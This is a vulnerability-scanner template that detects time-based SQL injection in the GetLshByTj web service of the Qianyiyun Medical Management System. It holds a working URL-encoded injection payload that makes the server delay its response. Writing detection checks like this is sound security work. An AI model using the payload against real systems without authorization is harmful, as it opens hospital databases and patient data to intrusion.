id: poc-qianyiyun-medical-management-system-sqli

info:
  name: Qianyiyun Medical Management System GetLshByTj SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL Injection vulnerability in Qianyiyun Medical Management System's GetLshByTj endpoint.

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /WebService.asmx/GetLshByTj HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "缺少参数"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true

  - raw:
      - |
        GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a{{t1}}%27%2d%2d%20%2d&redonly=true&tjstr=12 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<html"
        part: body
        negative: true
      - type: word
        words:
          - "text/xml"
        part: header
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
